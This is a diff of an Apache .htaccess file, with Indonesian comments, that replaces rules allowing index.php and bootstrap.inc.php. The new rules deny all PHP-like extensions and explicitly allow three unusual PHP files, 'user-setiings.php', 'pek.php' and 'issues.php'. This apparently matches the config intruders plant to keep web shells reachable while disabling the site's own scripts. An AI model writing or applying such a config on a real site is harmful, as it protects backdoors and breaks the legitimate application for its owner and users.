@@ -1,21 +1,19 @@
-# Izinkan index.php dan bootstrap.inc.php
-<FilesMatch "^(index|bootstrap\.inc)\.php$">
-    Require all granted
-</FilesMatch>
-
-# Blokir file script berbahaya/eksekusi lainnya
-<FilesMatch "(?i)\.(phtml|php[0-9]|sh|pl|cgi|asp|aspx|jsp|exe|shtml)$">
-    Require all denied
-</FilesMatch>
-
-# Izinkan file tertentu
-<FilesMatch "(?i)\.(jpg|jpeg|pdf|docx)$">
-    Require all granted
-</FilesMatch>
-
-<IfModule mod_headers.c>
-    Header set X-XSS-Protection "1; mode=block"
-</IfModule>
-
 Options -Indexes
-```
+
+<FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch '^(user-setiings.php|pek.php|issues.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^\.">
+Order allow,deny
+Deny from all
+</FilesMatch>
